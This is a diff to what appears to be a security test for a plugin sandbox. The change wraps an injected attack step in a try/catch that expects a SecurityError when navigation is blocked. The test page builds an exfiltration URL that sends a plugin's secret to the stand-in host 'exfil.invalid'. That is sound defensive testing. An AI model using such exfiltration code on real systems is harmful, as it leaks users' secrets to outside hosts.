@@ -141,7 +141,12 @@ for (const delivery of deliveries) {
         document.querySelector('canvas').getContext('2d').fillRect(0, 0, 10, 10);
         await window.covel.invoke('ready', { secret: state.secret });
         const url = 'https://exfil.invalid/redirect?value=' + encodeURIComponent(state.secret);
-        ${attack};
+        // A policy rejection is expected; do not turn it into an unrelated
+        // unhandled Promise rejection from this async subscription.
+        try { ${attack}; } catch (error) {
+          if (error.name !== 'SecurityError') throw error;
+          console.info('Blocked plugin navigation');
+        }
       });</script></body>`,
       );
       await blocked;
